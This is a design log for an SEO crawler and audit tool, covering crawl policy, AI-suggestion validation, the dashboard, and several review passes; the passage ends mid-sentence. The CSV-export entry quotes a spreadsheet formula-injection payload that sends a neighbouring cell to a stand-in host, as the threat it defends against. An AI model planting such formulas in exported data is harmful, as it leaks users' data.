# Design decisions

One entry per phase. Written so a non-author can defend the design on camera.

## Phase 0 — Scaffold

**What it does.** Sets up the package layout, config, JSON logging, shared models, the
quality gate (ruff, mypy --strict, pytest) and CI, before any feature code exists.

**Non-obvious decision.** Configuration is a single pydantic-settings object with a printed,
redacted "effective config" line. Every knob has a validated default and a ceiling, so a typo
in `.env` fails at startup rather than mid-crawl, and the crawl caps can be lowered by flags
but never raised past the hard limits.

**What I chose not to do.** No structlog. Stdlib `logging` plus a 30-line JSON formatter and a
`contextvars` run_id gives the same result with one fewer dependency to explain.

**Failure mode prevented.** The 400-lines-per-module rule is enforced by a test, and the
50-lines-per-function rule by ruff's statement count, so the architecture constraints from the
brief cannot quietly erode as phases are added.

## Phase 1 — Crawler

**What it does.** Async breadth-first crawl of one site: robots.txt and sitemaps first, then
pages, with per-host rate limiting, hard caps, manual redirect following, and every page
written to SQLite the moment it is fetched.

**Non-obvious decision.** Redirects are followed by hand (`follow_redirects=False`) so the
full chain is recorded, and off-site redirects stop the chain instead of following it. Just as
deliberately, an unreadable robots.txt (5xx or network failure) disallows everything and the
run is marked `failed`, while a missing one (404) allows everything. That is the conservative
reading Google documents, and it means a TLS or proxy problem can never turn into an
accidental unpoliced crawl.

**What I chose not to do.** No worker pool with queues and locks. A single loop keeps at most
`max_concurrency` tasks in flight with `asyncio.wait`, so the concurrency cap is structural
and there is nothing to get out of sync. No async SQLite driver either: writes are
sub-millisecond and one connection on the event loop is simpler to reason about than a thread
pool.

**Failure mode prevented.** The network dying mid-crawl. A single failed URL is recorded as a
status-0 page and the crawl continues; three consecutive transport failures abort the run as
`partial` with the pages so far intact, and Ctrl+C does the same. There is no state that
exists only in memory.

## Phase 2 — Deterministic audit engine

**What it does.** Runs 25 pure rules over every HTML page of a run, scores each page out of
100, and rolls the results up into a site summary. Works with no OpenAI key at all; this is
the layer that always produces value.

**Non-obvious decision.** A rule is a plain function `(page, context) -> list[str]` registered
with a decorator that carries its id, severity and a one-paragraph explanation. Rules never
see the database or the network: cross-page facts (duplicate titles, inbound links, sitemap
membership, link-target status codes) are computed once into a `CrawlContext` and handed in.
That is what makes the table-driven fixture tests possible: one HTML file, one exact set of
expected rule ids, no mocking.

**What I chose not to do.** No rule engine, plugin loader or YAML configuration. Adding a rule
is adding a function; the registry rejects duplicate ids and a test asserts every registered
rule is covered by a fixture or a dedicated test. Scores are a flat weighted sum
(critical 15, warning 5, notice 2, floored at 0) rather than a tuned model, because a score you
can recompute in your head is one you can defend.

**Failure mode prevented.** Re-running the audit is idempotent: issues and scores for a run
are replaced in one transaction, so a crash mid-audit can never leave half of the old results
mixed with half of the new ones. Pages without an HTML body (404s, binaries, network
failures) are excluded from scoring instead of being punished for content they never had.

## Phase 3 — The AI layer

**What it does.** For pages whose title or meta description failed a deterministic rule, asks
GPT-4o for a rewritten title, meta description and a one-line diagnosis, using Structured
Outputs with a strict JSON schema. Every answer is checked by `ai/validate.py` before it is
stored; the model gets exactly one repair attempt with the specific violations listed, and a
second failure is recorded as `rejected` with the reason. Unchanged pages are served from a
content-hash cache at zero cost, and a pre-flight token estimate stops the run before it can
exceed `--max-cost`.

**Non-obvious decision.** The validator is deliberately dumb. Lengths are counted, "unchanged"
is byte equality, "invented facts" means a number, price, year, percentage or claim phrase in
the proposal that does not appear anywhere in the page text, and "truncated" is a punctuation
and last-word check. No second model call judges the first. That makes every rejection
explainable in one sentence and reproducible in a unit test, which is worth more here than
catching subtler hallucinations. The last-word heuristic (a final word that is not on the page
but is a prefix of a word that is) will occasionally flag a legitimate title; the cost of that
is one repair call, whereas the cost of the opposite mistake is showing a cut-off title as a
recommendation.

**What I chose not to do.** No LangChain, no agent loop, no retries beyond one repair, no
embeddings. Prompt-injection defense is a regex strip plus explicit delimiters plus a system
prompt that names page text as data; it is not a classifier, because the validator is the real
backstop: an injected instruction can at worst produce an off-task suggestion, and an off-task
suggestion is rejected on the same grounds as any other.

**Failure mode prevented.** Partial or unvalidated writes. Each page's API calls and its
suggestion row are committed in one transaction, and the suggestion columns are only ever
populated from a validated object. Missing key, bad key, rate limit, timeout and outage all
map to one `AIUnavailable` path that marks remaining pages `unavailable`, prints one warning,
and leaves the deterministic audit untouched. Cost is never a surprise: the budget gate runs
before each call, the run total is printed, and re-running on an unchanged site costs $0.

## Phase 4 — Dashboard and export

**What it does.** `seo-scout serve` runs FastAPI with four JSON endpoints (runs, summary,
paginated/filterable pages, CSV and JSON export) and one static HTML page that renders a score
histogram, an issues-by-rule chart, a sortable page table, and a before/after panel showing
the original and proposed title and meta with the validator's verdict and reason.

**Non-obvious decision.** Filtering, sorting and pagination happen in Python over one query's
rows, not in SQL. A run is hard-capped at 500 pages, so the whole result set is a few hundred
small objects; pushing `WHERE severity = ?` into the repository layer would have leaked API
concerns into `store` for no measurable gain. The dashboard fetches all pages once and does
its own filtering client-side for the same reason, so every filter change is instant.

**What I chose not to do.** No frontend framework, no build step, no bundler: one HTML file,
vanilla JS, Chart.js from a pinned CDN URL with a Subresource Integrity hash. The recording
needs the data to be legible, not the framework to be impressive. Each request opens and
closes its own SQLite connection instead of sharing a pool; at this scale the connection
cost is microseconds and the isolation removes a whole class of threading bugs.

**Failure mode prevented.** Showing an unvalidated suggestion. The API serves suggestion
columns straight from the store, and those columns are only ever written from a validated
object (Phase 3), so the dashboard can render "proposed title" without re-checking anything.
Rejected pages show the exact violations instead of a blank, which is what makes the AI layer
auditable on camera.

## Phase 5 — Diffing and automation

**What it does.** `seo-scout diff a b` compares two runs of the same site: pages added and
removed, per-page score changes, issues fixed and issues introduced, as a terminal table or
JSON. `seo-scout report <url>` is the scheduler entry point: crawl, find the previous run of
that site, diff, write `reports/run-N.json` and `.md`, and post a one-line summary to Slack if
`SLACK_WEBHOOK_URL` is set.

**Non-obvious decision.** A diff compares rule ids per page, not issue messages. Messages
contain counts and quoted text ("Title is used on 3 pages") that change for reasons unrelated
to the page itself, so comparing them would report churn instead of fixes. Rule ids are stable
identities: a rule that fired last week and not this week is a fix, full stop. Pages that
appear or disappear are reported separately and never counted as fixed or introduced issues.

**What I chose not to do.** No `--schedule` daemon. A process that sleeps for a week is a
process that dies for a week; cron and Windows Task Scheduler already do this job well, so
the README gives one line for each. No Slack SDK either: an incoming webhook is one HTTP POST,
and a failed post is logged and reported, never allowed to fail the report.

**Failure mode prevented.** Automation that silently drifts. The report command is
idempotent per run, exits non-zero only when the crawl itself failed, and the very first run
of a site writes a baseline report rather than erroring on "nothing to compare", so a scheduler
can be pointed at a new site with no manual bootstrapping.

## Phase 6 — Docs and verification

**What it does.** README with a four-command quickstart, a mermaid architecture diagram, the
crawling policy, the AI validation design and its rationale, cost characteristics, cron and
Task Scheduler one-liners, and an honest limitations list. The definition-of-done crawl
(`crawl https://books.toscrape.com --max-pages 50`) ran clean: 50 pages in 26 s, 187 issues,
AI stage skipped with one warning because no key was configured.

**Non-obvious decision.** The README leads with what the validator rejects and why, not with
features. For a portfolio piece the reviewer's first question is "how do you know the model's
output is right?", and the answer has to be visible without opening the code. The limitations
section is written to be quoted back at me: no JS rendering, English-calibrated heuristics,
single host, a heuristic score, a truncation check that can false-positive. Naming them is
cheaper than being asked about them.

**What I chose not to do.** No `--schedule` flag, no Docker, no hosted demo. Two scheduler
one-liners cover the automation story on every OS the tool runs on, and a screenshot of a real
crawl covers the demo. The dashboard grew two query-string hooks (`?theme=`, `?page=`) purely
so the screenshot is reproducible from one headless-browser command that lives in CLAUDE.md.

**Failure mode prevented.** Documentation drifting from behaviour. The quickstart commands,
the sample output block and the cost table are the literal output and arithmetic of the code as
committed; the CLAUDE.md "pending" list records the two things that need a human (a GitHub
token scope and an API key) so the next session does not rediscover them.

## Post-launch — Redirect targets are requested verbatim

**What happened.** The first crawl of `peps.python.org` recorded 17 of 20 pages as
`too_many_redirects` after a single 301. The server redirects `/pep-0008` to `/pep-0008/`;
the fetcher ran the `Location` header through `normalize()`, which collapses trailing slashes
for frontier dedupe, and so requested `/pep-0008` again, ten times.

**Root cause, not symptom.** `normalize()` answers "is this the same page?"; it was being asked
"what should I request next?". Those are different questions. The fix asks the right one:
`fetch()` now resolves `Location` with plain `urljoin()` and requests exactly what the server
named. `final_url` therefore keeps the server's spelling, which is also the correct base for
resolving the page's relative links. The one downstream consumer that needs identity, the
frontier's `mark_seen`, normalizes on its side.

**Failure mode prevented.** Any site that canonicalises with a trailing slash (GitHub Pages,
most static hosts, Django's `APPEND_SLASH`) was invisible to the audit beyond its home page.
The regression tests pin both halves: the fetcher follows `/a -> /a/`, and the crawler treats
a later link to `/a` as the page it already has.

## Post-launch — Repaired suggestions keep the first attempt's violations

**What happened.** The first text-heavy live run (`peps.python.org`) triggered five repairs.
The dashboard could say *that* a repair happened but not *why*: `reason` was only written on
rejection, so the evidence of what the model got wrong the first time was thrown away the
moment the second answer passed.

**Decision.** A `repaired` outcome now carries `"first attempt failed validation:"` plus the
same violation summary the model was shown. It rides the existing `reason` column, the cache
row and the CSV export unchanged; the dashboard renders it in the warning colour instead of
the rejection red so a repaired page does not read as a failure.

**Why it matters for the design.** The validator is the argument for the whole AI layer. A
reviewer should be able to open any repaired page and see the exact check that caught the
first answer, which is the difference between "we validate" and "here is the validation
working". It also gives a cheap signal for prompt tuning: if the same code dominates the
repair reasons, the prompt, not the validator, is what to fix.

## Post-launch — Sitemap discovery also looks under the start path

**What happened.** The first crawl of `docs.astral.sh/uv/` found "1 seed" from a sitemap
that lists 84 pages. That host's robots.txt is an HTML page (no `Sitemap:` line), so discovery
fell back to `/sitemap.xml` at the host root, which is a 404. The real file is
`/uv/sitemap.xml`: MkDocs, Docusaurus and most docs generators write the sitemap at the site's
base path, and a docs host often serves several such sites under one domain.

**Decision.** With no robots hint, try the host root first and then `<start path>/sitemap.xml`
when the start URL has a directory-like path (no dot in its last segment). One extra request at
most, and it is only made when the start URL says the site is not at the root. Robots-declared
sitemaps still take priority and skip both guesses. *(Superseded twice since; the fourth
review pass below has the current order: the start path's guesses first, each source with
its own file budget, the host root only as a last resort.)*

**Consequence worth knowing.** Seeds change crawl order. On a capped run the pages you get
are the first N seeds, so a site that gains a sitemap between two runs will show a large
added/removed diff that is churn, not change. The diff report is honest about it either way;
this note exists so nobody reads that churn as a regression.

## Post-launch — Ease-of-use pass and commercial footing

**What changed.** `seo-scout init` writes `.env` from the template (never overwrites);
`serve --open` launches the browser; `crawl` and `report` end with the next command to run.
The dashboard gained a *Start here* list (five weakest pages, each with its headline issue),
a legend for the severity pips, a dismissable one-line "how to read this" strip, and copy
buttons on every validated title and meta. README leads with three commands and what the
reader will see; the rationale moved below. A `LICENSE` (MIT) and `docs/commercial.md` were
added. Design note: `docs/superpowers/specs/2026-09-05-ease-of-use-design.md`.

**Why these and not more.** Each one removes a specific question a first-time user asks:
"where do I start", "what do the coloured dots mean", "how do I get this text into the
CMS", "what do I run next". None adds a dependency, an API call, or a build step; the
dashboard is still one static file and the CLI is still one module under 400 lines.

**Commercial decision.** The code stays public under MIT. The saleable things are setup,
hosting, adaptation and support, and `docs/commercial.md` exists so a buyer's first three
questions (what leaves my machine, what does it cost, what will it not do) are answered in
writing before the demo. Selling source licences for code already public under MIT would
not survive a customer's lawyer, so that path was closed deliberately.

## Post-launch — Install path verified from the wheel and from GitHub

**What was checked.** `uv build` produces a wheel that contains the dashboard HTML, the
SQL schema and the LICENSE. `uv tool install` from that wheel, and directly from
`git+https://github.com/Yataghanac/seo-scout`, gives a `seo-scout` command that runs `init`,
`crawl` and `serve` end to end with no source checkout. `init` writes a minimal `.env` when
no template is present, which is the tool-install case.

**What it changed.** The README quickstart now leads with the tool install, since that is
what a customer types; the clone-and-`uv run` path moved under Development. The install line
pins `--python 3.12` because on a machine whose default Python is older uv otherwise refuses
with a resolution error, which is the first thing a non-developer would hit. `[project.urls]`
was added so the package page, when it is published, links back to the repo and to this file.
No PyPI publish yet: a GitHub install needs no account and no release process.

## Post-launch — Review pass: identity versus request URL, and nine smaller fixes

**Trigger.** A code review of the post-launch commits found that the redirect fix had been
applied one layer too shallow. `fetch()` requested redirect targets verbatim, but the crawler
still requested the *start URL and every link* in `normalize()`'s slash-stripped form. On any
site that canonicalises with a trailing slash that meant two requests per page and a
crawler-manufactured redirect hop on every one: run 4 of `peps.python.org` showed 17 of 20
pages with a 301 the server never asked for, and a site-wide http->https redirect would have
tripped the `redirect_chain` rule on every page.

**Decision.** Two URL forms, two jobs, kept apart everywhere: `urls.normalize()` is the
page's identity (frontier dedupe, `pages.url`, `links`, `sitemap_urls`, audit keys);
`urls.resolve()` is what gets fetched (resolved against the base, fragment dropped, spelling
kept). The parser returns links as written, the frontier carries `(key, depth, request)`,
sitemap seeds keep the sitemap's spelling with normalized keys alongside, and the start URL is
fetched as the user typed it. Re-crawling the PEP site and the uv docs after the change: zero
redirect hops, identical page sets and sitemap counts.

**Also fixed from the same review.** A fragment-only `Location` (`#top`) looped ten
rate-limited requests; it now stops after one. The path-prefix sitemap guess collapsed to the
host root when the start URL carried a query string, skipped versioned prefixes like `/3.12/`,
and was never tried when robots.txt named a sitemap; it is now built from URL parts and
always tried alongside. `serve --open` opened a browser tab even when the port was taken, and
built the URL from the bind address (`0.0.0.0`, `::`); the timer is now cancelled when uvicorn
exits and the URL is a connectable loopback form. The next-step hint dropped `--db` and landed
in cron mail from `report`; it now carries the database path and `report` prints it only on a
terminal. *Start here* listed clean pages and ranked ties differently from the export's
`worst_pages`; it now renders from the server's ranking and only pages with issues, and its
narrow-screen rule was moved after the base rule it overrides. `init` had a hand-copied
fallback template that had already drifted from `.env.example`; the template is now shipped
inside the package and a test asserts the two files are identical. Repaired suggestions store
the bare violation list rather than a prose sentence, and rejected ones keep both attempts.

## Post-launch — Second review pass: keys and spellings all the way down

**Trigger.** A second review of the identity-versus-request commit found that the split had
been carried through the fetcher and the frontier but not through the parser's consumers.
`ParsedPage.links` held request spellings, so the `broken_links` rule looked up
`https://site/dead/` in a status table keyed by `https://site/dead` and reported nothing;
the crawler checked robots.txt against the key, so `Disallow: /private/` (which permits
`/private`) let `/private/` through; and every anchor was parsed three or four times because
the key was computed, discarded and recomputed (about 6.5 s per 150k links).

**Decision.** The parser is the one place a link's two forms are derived, and it returns
both: `ParsedPage.links` is a list of `Link(key, url)`. `urls.link_pair()` produces the pair
from a single split; `normalize()` and `resolve()` are now its two halves, so they cannot
drift. Consumers pick the half that matches what they compare against: the audit's
`internal_links` and the crawler's frontier use `key`, the fetcher and the robots check use
`url`. `Frontier.add()` requires the request spelling rather than defaulting to the key, so a
future caller cannot quietly reintroduce the normalised request.

**Netloc is rebuilt, never copied.** `resolve()` used to keep `parts.netloc` verbatim, so a
link written as `https://user:pw@host/` would have been requested with Basic auth and stored
with the credential. Both forms now rebuild the netloc from hostname and port (bracketing
IPv6, which `normalize()` had also been mangling), so credentials never reach the wire or the
database.

**Redirect loops compare wire forms.** The loop check was string equality against the
current URL, so `Location: HTTPS://HOST/a`, `:443`, or an A->B->A cycle each burned ten
rate-limited requests. `fetch()` now keeps the wire form (`resolve()`) of every URL requested
in the chain and stops at the first repeat. `/a` and `/a/` remain distinct, as they must.

**Also from the same review.** Sitemap discovery walks the start path's directories
deepest-first (three at most, a trailing file segment skipped) and stops at the first that
answers, so `/uv/guides/` finds `/uv/sitemap.xml` and `/docs/index.html` does not look under
the file. `summarize_run` excludes issue-free pages from `worst_pages`, so the export, the
report and Slack agree with the dashboard that it is a to-do list; the dashboard's fallback
for a page outside its loaded list now shows the issue count instead of "No issues". A
rejected suggestion's reason kept the repair violations twice; the first attempt's are now
snapshotted once. The next-step hint quotes a database path containing whitespace, and
`_browser_url` no longer double-brackets an already-bracketed IPv6 host.

## Post-launch — Third review pass: nothing a page serves may abort a crawl

**Trigger.** A third review of the previous fix found two ways one hostile page could end a
whole run: an anchor like `<a href="https://[::1/x">` raised `ValueError` out of the parser
(the `urljoin` call sat outside the `try` that guarded `urlsplit`), and a `Location:
javascript:void(0)` raised `httpx.InvalidURL`, which is not a `TransportError`, so the retry
loop let it escape. Either left the run marked `running` forever and every later audit and AI
pass of that run failed with it. The same review found robots.txt enforced only at enqueue,
so `/go` -> 301 `/private/` fetched and stored a disallowed page, and four regressions in the
sitemap prefix walk that the previous pass had introduced.

**Decision.** The parser and the fetcher classify; they never raise for something a site
sent. `link_pair()` parses inside one `try` and returns None for anything the standard
library rejects, so a bad anchor is one dropped link. `_request()` catches `InvalidURL` and
reports `bad_redirect`; httpx has already discarded the response by then, so the row keeps
status 0 (the same value a failed request gets) with the reason alongside *(the fourth pass
recovers the real status through a response hook)*. The `skipped`
vocabulary now distinguishes `redirect_loop` (a hop already in the chain), `too_many_redirects`
(ten distinct hops), `bad_redirect` (a Location no crawler can follow, `ftp://` included) and
`off_site_redirect`, so the dashboard's error column says which one happened.

**One gate for every request.** `Fetcher.fetch()` takes an `allowed` callable and asks it
before each redirect hop; the crawler passes `policy.allowed`, the same function that gates
`plan()` and the frontier. A redirect into a disallowed path stops with
`disallowed_redirect`, the disallowed URL recorded as `final_url` and never requested. The
frontier no longer repeats the same-site check `_process` already made, and seeds arrive as
`Link(key, url)` pairs so `run()` stops re-normalizing them.

**Sitemap walk, corrected.** The prefix guesses run before the robots.txt sitemaps again:
a large index could exhaust the 50-file cap before the start path's own sitemap was ever
requested, and a guess robots.txt already named is now simply skipped as visited rather than
letting the walk continue up to a sibling site. The file-versus-directory heuristic is gone:
`/3.12` and `/index.html` look alike, so `/docs/index.html/sitemap.xml` costs one 404 and the
bound pays for it. A 200 counts as a hit only when the body parsed as a `urlset` or
`sitemapindex`; a soft-404 HTML shell no longer stops the walk empty-handed.

**One shape for a link.** `urls.Link(key, url)` is a NamedTuple returned by `link_pair()`
and carried unchanged by the parser, the sitemap seeds and the crawler, replacing a pydantic
model, a bare tuple and two ad-hoc pairs. `registrable_domain()` caches the public-suffix
lookup per host (`same_site` runs once per link; a crawl asks about a handful of hosts).

**Also from the same review.** Failed fetches store the requested spelling as `final_url`
like every other row. The next-step hint quotes any database path a shell would split on
(`&`, `(`, whitespace), not only whitespace; `$` and `"` are left alone because bash and
PowerShell escape them differently. The dashboard's *Start here* row for a page outside the
loaded list shows the issue count and is not clickable, since there is no detail to open.

## Post-launch — Fourth review pass: a run row never stays `running`

**Trigger.** A review of the third pass found that its invariant ("nothing a page serves may
abort a crawl") held for anchors and for two of the four ways a Location header can be
unfollowable, and nowhere else. httpx wraps a malformed http(s) Location (`https://[::1/x`,
`https://e.com:abc/`) into `RemoteProtocolError`, a transport error, so it was retried three
times with backoff and counted towards the three-strikes abort. A sitemap-index child or a
robots.txt `Sitemap:` line with the same shape raised straight out of discovery, because index
children bypassed `link_pair` and `httpx.InvalidURL` is not an `HTTPError`. And discovery ran
after `create_run` but outside any handler, so every one of these left the run row `running`
forever, where `previous_run` would pick it up as the baseline for the next diff.

**Decision: the invariant lives in one place.** `Crawler.run()` wraps everything after
`create_run` in a handler that marks the run `failed` with the exception's name and message,
then re-raises. Bugs still surface; they no longer poison the database. The specific holes
are closed too, but the guard is what makes the promise true for the next one.

**Decision: the fetcher never guesses.** httpx builds the next request from a Location header
even with `follow_redirects=False`, and by the time it raises the response is closed. A
response event hook, registered once per client, runs before that build and keeps the
response in a task-local `ContextVar`; `_request()` hands it back as an ordinary 3xx attempt
and `fetch()` classifies the Location with the same code as any other hop. The real status is
stored, nothing is retried, and there is no exception-message sniffing. Building the request
(`client.build_request`) happens outside that try, so a URL httpx refuses outright (a bad IPv4
literal, an over-long URL, a malformed punycode label, which idna reports as a
`UnicodeError`) is its own label, `bad_url`, with status 0 and no request made. The same
`UNFETCHABLE` tuple guards the one-shot fetches of robots.txt and sitemaps, and
`registrable_domain()` returns empty for anything the parser rejects, so `same_site()` is
total: a hostile canonical href could have crashed the audit the same way.

**Sitemap discovery, third and last ordering.** The start path's guesses come first because
the user named that site; robots.txt sitemaps follow; the host root is tried only when robots
names nothing and no guess answered, since after a hit it can only seed sibling sites. Each
`drain` call has its own file budget (50) over a shared `visited` set, so a large index on
either side cannot starve the other, which was the real defect behind both orderings. Every
URL a sitemap names now goes through `link_pair` before anything touches it.

**One shape, one order.** `Frontier` carries `(Link, depth)`, so `_process`, `_enqueue` and
`_record_failure` take a `Link` instead of a key and a spelling as separate positionals; the
docstring on `Link` is now true. `_enqueue` checks the frontier's `seen` set before asking
protego: a link met again on later pages (most of them) paid ~13 us for a robots match that
could not change anything, about two seconds per 5,000-page crawl. The API's score sort
breaks ties like `summarize_run` (issue count, then URL), so the dashboard's loaded list
always contains the pages its *Start here* panel names; the count-only fallback row stays as
a degradation path, not a feature. The next-step hint always double-quotes the database path:
bash strips an unquoted backslash (`C:\sites\t.db` arrives as `C:sitest.db`, and `connect()`
would create that file), and double quotes are harmless in PowerShell and cmd. The
`registrable_domain` cache test asserts `cache_info()` after `cache_clear()` instead of
monkeypatching the extractor, so it cannot pass vacuously on a warm cache.

## Post-launch — First live run since the review passes

**Trigger.** The four review passes rewrote fetching, redirect classification and sitemap
discovery, and every run in the database predated them: the new code had only ever met respx
mocks. A live pass — `docs.astral.sh/uv` crawled, audited, rewritten, crawled again and
diffed, then `books.toscrape.com` for a site that publishes no sitemap — confirmed the design
holds where it was rewritten. The normalize/resolve split requested `/uv/concepts/` and stored
`/uv/concepts` with an empty redirect chain, while the start URL, requested verbatim, kept its
real 308. A start URL that 404s still produced a crawl, because the prefix guess found
`/uv/sitemap.xml` and seeded from there. The second run cost $0.0000: all 25 suggestions came
back from the cache, and the diff reported no change. Two things did not hold, and both were
found by using the tool rather than by reading it.

**Decision: a reading command never creates a database.** `db.connect` opens or creates, which
is what `crawl` wants and never what `serve`, `audit`, `ai` or `diff` want. Serving a path that
does not exist produced an empty dashboard reading "No runs yet", a stray SQLite file in the
working directory, and no hint that the path was wrong — which is exactly what happened when a
launcher passed the database path through a shell that ate its backslashes, turning
`C:\Users\PC\...\live.db` into `C:sersCppData...ive.db`. The project already knew that failure
mode: `_quoted()` exists because bash strips an unquoted backslash. It defended the hint it
prints and not the command that receives it. `_require_db()` now refuses a missing file for
all four reading commands, naming the path and the crawl that would create it; `:memory:` is
still allowed. `crawl` and `report` are unchanged, because creating is their job.

**Decision: count the sitemaps that answered, not the places we looked.** `sitemap_files` was
`len(visited)`, the number of locations tried, so a site with no sitemap at all reported having
read four of them — the one number a reader would use to decide whether discovery worked. The
count is now the number of files that parsed as a sitemap, and the locations tried are reported
alongside as `sitemap_fetches`. Both are worth having: together they say "we looked in four
places and read none", which is the actual diagnosis.

**A test that passed for the wrong reason.** `test_audit_command_rejects_unknown_run` asserted
`"42" in result.output` against a database that did not exist, so it never reached the
unknown-run branch — and it passed anyway, because `42` is a substring of
`max_response_bytes=5242880` in the effective-config line. It now crawls first and asserts on
the message it means to test. A substring assertion on a short number is a coin flip against
any line that prints numbers.

## Post-launch — The CSV export is a third untrusted-data sink

**Trigger.** The live pass continued into the export and API surfaces, which the crawl pass
never touched. Both held up. Filters, sorting, an out-of-range page number, `size=0` and an
unknown run id all answered correctly against real data, and `diff --json` agreed with the
table. The dashboard held up too: `esc()` covers `& < > " and the apostrophe`, and every
interpolation into `innerHTML` goes through it — the page title, the model's proposed title
and meta, its diagnosis and its rejection reason, and the copy button's `data-copy`
attribute. The CSV export did not.

**The threat this tool actually has.** SEO Scout audits sites it does not own, so a page's
`<title>` and description are attacker-chosen input, and `ai/sanitize.py` already says so:
"Page text is untrusted." The CSV carries that same text into a different interpreter. Excel,
LibreOffice and Sheets evaluate any cell whose first character is `=`, `+`, `-`, `@`, a tab or
a carriage return, so a page served with a title of `=HYPERLINK("http://x/?"&A1,"click")`
arrives in the audit report as a live formula that can leak the cell beside it. `csv.DictWriter`
was already doing its job — commas, quotes and newlines are quoted correctly — but the CSV
grammar and the spreadsheet's formula parser are two different layers, and only the first was
defended.

**Decision: mark such a value as text, do not change it.** `as_text()` prefixes one apostrophe,
which is the spreadsheet's own "this cell is text" marker: it is stripped on display, survives
a round trip, and still reads as the original string in a text editor or `csv.DictReader`.
Stripping the character would silently alter what the site actually served, which is the one
thing an audit report must not do. The guard runs over every string column rather than a
curated list, so a column added later cannot quietly miss it; numbers are left alone, and on
the 25 real rows of a live run it changed nothing.

**Not the JSON export.** JSON has no formula interpreter, and a consumer that pastes JSON into
a spreadsheet has already left the format. Defending one sink is the point; defending every
hypothetical one would make the data less faithful for no gain.

## Post-launch — Every rule, against a real socket

**Trigger.** Live crawls of real sites had fired 8 of the 25 rules. The other 17 were covered
by unit fixtures (a test already enforces that every rule id has a case or a dedicated test),
but the cross-page ones — `broken_links`, `orphan_page`, `redirect_chain` — are computed from
the crawler's own bookkeeping, and that bookkeeping had never been assembled from real HTTP
responses. Finding a site that happens to serve two chained redirects, a 404 it links to and a
sitemap entry nothing links to is luck; building one is not.

**Decision: a fixture site, not more mocks.** `dev/fixture_site.py`, a 200-line
`http.server`, serves one deliberately broken page per rule: a missing title, two h1s, a canonical pointing
off-domain, `X-Robots-Tag: noindex` as a real response header, an image without alt, a page
linking to a 404, a two-hop 302 chain, a 3 MB page, a 2.5-second response, and an `/orphan`
listed in `sitemap.xml` that nothing links to. The suite already mocks at the transport layer
with respx; the point of this one is to exercise the layer respx replaces — real sockets, real
redirect following, a real `robots.txt` and a real sitemap. 22 rules fired in one crawl, and
with the three the live sites had already produced that is all 25.

**Everything held.** Each message named the right page and the right value, `/missing` was
recorded at depth 2 behind the page that linked to it and excluded from the audit as a
non-200, sitemap seeds came in at depth 0, and the redirect row stored both hops with
`/redirect-end` as its final URL. The response-size cap was the last unexercised transport
guard and it holds from both sides: a 6 MB page with an honest `content-length` is refused
before a byte of body is read, and a chunked 6 MB response with no `content-length` at all is
aborted mid-stream. Both were stored as `too_large` with the status the server really sent.

**Two things did not read well.** `broken_links` said "1 broken internal links" and
`images_missing_alt` said "1 of 2 images have no alt attribute". Both are the report a client
reads, and both had passed unit tests forever because every fixture used the plural. Fixed
with the singular, tested from both sides. Nothing else in this pass needed changing, which is
the result worth recording: the crawler's bookkeeping survived contact with a real server.

**Kept as a tool, not wired into pytest.** The fixture lives in `dev/`, outside the package and
imported by nothing. Binding a socket in the suite would buy permanent regression cover for all
of this, but the brief says tests are offline with zero network calls and finish inside fifteen
seconds, and that invariant is worth more than the cover: it is why the suite can run anywhere,
in any order, with no ports to collide over. `ruff` lints `dev/` like everything else, with one
per-file ignore — the page builder takes one keyword per rule, which is the point of it.

## Post-launch — The three guards, exercised with a real key

**Trigger.** Three surfaces had never run end to end: the AI spend cap with a real key in the
environment, the Slack webhook (the machine that ran every earlier test had none configured),
and `init`. The spend cap is the one that matters — it is the only thing standing between a
mistyped `--max-pages` and a bill — and it had only ever been exercised against a fake
completer.

**It holds.** `--max-cost 0.001` against a ten-page crawl made **zero** API calls and spent
**$0.0000**: the pre-flight tiktoken estimate is compared to the remaining budget before the
request is built, so the first call is refused rather than the last one regretted. Each page
recorded why, in cents it can prove: `budget: $0.0039 needed, $0.0010 left`. Raising the cap
to $0.004 let exactly two calls through at $0.0033, so the guard permits spending up to the
cap rather than shying away from it.

**Decision: costs are printed to four decimals everywhere, including the cap.** The run-level
warning read `AI budget of $0.00 exhausted after $0.0000`, because that one line formatted the
cap with `:.2f` while every other cost in the codebase uses `:.4f`. A user who set a tenth of
a cent would be told their budget was zero — which reads as a broken config rather than a
working guard, and sends them looking in the wrong place. The same line said "1 pages skipped".
Both fixed; the plural case already worked, and is now pinned by a test.

**Slack, and the promise around it.** `report` posts once, on the second run and not on the
baseline run that has nothing to diff, with the right content type and a message carrying real
numbers. Pointed at a dead port it logs `slack post failed`, prints `slack: failed (see logs)`,
writes its report files anyway and exits 0. That is the documented contract for a command
"built for schedulers", and it is worth having actually watched it happen: a notifier that can
fail the job it reports on is worse than no notifier.

**`init` keeps its promise too.** Run twice, the second run refuses: `.env already exists`. A
real key placed in that file survived, which is the only behaviour that matters for a command
whose whole job is to not destroy credentials.

## Post-launch — The README's numbers are claims, and now they are tested

**Trigger.** Reading the front door end to end and checking each factual claim against the
code, the same way everything else got checked this session. Most held: the hard caps, the
rate limit, the user agent, the backoff policy, the robots reading of 4xx and 5xx, the score
weights, the validator thresholds, the 4,000-character prompt slice and the 2,000-character
cache slice, the coverage figure, and CI running exactly the four commands listed. Two did
not. The architecture diagram said "24 pure rules" and the suite runs 25; `git log -S` shows
all 25 arrived in the same Phase 2 commit, so this was a miscount from the day it was written
rather than a count that drifted, and the Phase 2 entry below repeated it. The test suite had
grown past the "~8 s" the README quotes.

**Decision: pin the numbers that describe code.** `tests/test_readme.py` reads README.md and
asserts the rule count in the diagram and in the fixture paragraph both equal `len(RULES)`,
that the documented caps and rate limit are the values `Settings()` actually carries, and that
the advertised user agent is the one the crawler sends. This follows the test that keeps
`.env.example` identical to the packaged template: prose about code is an invariant, and an
invariant nobody checks is a wish. It deliberately does not pin measured figures — the cost
tables, the sample run, the wall-clock timing — because those are observations with dates on
them, not statements about what the code does, and a test that fails when a crawl is 200 ms
slower teaches people to ignore failures.

## Post-launch — A crawl button, and the SSRF gate behind it

**Trigger.** The dashboard could read a run but never start one, so the empty state told a
first-time visitor to go open a terminal. Making `POST /api/crawls` real for a **hosted**
deployment — a client reaches this dashboard, not just its author — turns "which URL to crawl"
from a CLI argument only the operator can type into free text a stranger can submit, so target
safety and authentication stopped being optional.

**Decision: the crawler is injected, not imported.** `api/` may depend on `store` only
(CLAUDE.md); it must not import `crawler/`. `create_app` takes an optional `crawl_runner:
CrawlRunner | None`, a `Protocol` with one method, `start(url, max_pages) -> bool`. The real
implementation, `crawl_runner.BackgroundCrawler`, lives in its own module and imports both
`api.targets` and `crawler.crawler` freely; `cli.serve` wires it in, the way `cli._crawl` already
